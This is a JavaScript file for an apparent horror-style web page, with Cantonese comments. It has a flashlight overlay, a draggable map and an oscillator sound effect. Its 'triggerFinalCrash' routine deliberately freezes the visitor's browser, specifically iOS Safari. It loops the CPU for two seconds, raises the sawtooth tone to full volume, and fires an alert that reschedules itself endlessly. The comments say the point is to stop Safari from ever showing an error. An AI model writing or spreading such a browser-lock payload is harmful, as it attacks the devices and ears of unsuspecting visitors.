let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let systemCrashed = false;

let isDragging = false;
let lastX = 0, lastY = 0;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 必響音效：必須由 click 直接觸發
function initAudio() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    
    // 建立震盪器 (最簡單直接，一定響)
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.type = 'sawtooth';
    osc.frequency.setValueAtTime(100, audioCtx.currentTime);
    
    osc.connect(gain);
    gain.connect(audioCtx.destination);
    gain.gain.setValueAtTime(0.1, audioCtx.currentTime); // 初始細聲
    
    osc.start();
    
    // 儲存落去，等 crash 嗰陣變大聲
    window.globalOsc = osc;
    window.globalGain = gain;
    window.globalCtx = audioCtx;

    if (audioCtx.state === 'suspended') audioCtx.resume();
    audioStarted = true;
}

// 2. 啟動函式
function startExperience() {
    if (systemCrashed) return;
    if (intro) intro.style.display = 'none';
    
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});

    initAudio(); // 呢度由點擊觸發，Safari 會放行聲音
    isLightOn = true;
    updateFlashlight(mouseX, mouseY);
}

function updateFlashlight(x, y) {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

// --- 移動監聽 ---
window.addEventListener('touchstart', (e) => {
    startExperience(); // 摸第一吓就出聲
    isDragging = true;
    lastX = e.touches[0].clientX; lastY = e.touches[0].clientY;
}, { passive: false });

window.addEventListener('touchmove', (e) => {
    if (systemCrashed || !isDragging) return;
    e.preventDefault();
    let tx = e.touches[0].clientX; let ty = e.touches[0].clientY;
    posX += (tx - lastX); posY += (ty - lastY);
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight(tx, ty);
    lastX = tx; lastY = ty;
}, { passive: false });

window.addEventListener('touchend', () => isDragging = false);
window.addEventListener('click', startExperience); // PC 點擊出聲

// 3. 終極鎖死 (專殺 iOS/Safari)
function triggerFinalCrash() {
    systemCrashed = true;

    // A. 視覺瞬間變黑紅
    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    // B. 音效變噪音
    if (window.globalOsc) {
        window.globalOsc.frequency.setValueAtTime(500, window.globalCtx.currentTime);
        window.globalGain.gain.setValueAtTime(1.0, window.globalCtx.currentTime);
    }

    // C. 0.3 秒後絕殺
    setTimeout(() => {
        // iOS 絕招：利用無窮循環 + 同步彈窗
        // 彈窗會鎖死 UI，循環會鎖死 CPU
        function killIOS() {
            console.log("CRASHING...");
            // 利用同步阻塞，令 Safari 直到死嗰刻都唔會顯示「網頁出錯」
            const start = Date.now();
            while (Date.now() - start < 2000) {
                // 喺背景瘋狂做複雜運算
                Math.sqrt(Math.random() * 999999) * Math.sin(Math.random());
            }
            // 彈出一個永遠關唔完嘅視窗，喺 iOS 呢招會令 Safari 完全卡死
            alert("HELP ME.\nHELP ME.\nHELP ME.\nHELP ME.\nHELP ME.");
            
            // 遞歸，確保佢就算禁咗 OK 都會即刻出下一個
            setTimeout(killIOS, 0);
        }
        
        killIOS();
    }, 300);
}

// 測試用：30秒後自動撞
setTimeout(() => {
    // 擺粒白色嘢喺地圖中間
    const glitch = document.createElement('div');
    glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${-posX + window.innerWidth/2}px; top:${-posY + window.innerHeight/2}px; z-index:1001; box-shadow: 0 0 20px white;`;
    map.appendChild(glitch);
    
    const check = setInterval(() => {
        const r = glitch.getBoundingClientRect();
        const cx = window.innerWidth/2, cy = window.innerHeight/2;
        if (Math.abs(r.left + 25 - cx) < 60 && Math.abs(r.top + 25 - cy) < 60) {
            triggerFinalCrash();
            clearInterval(check);
        }
    }, 100);
}, 30000);
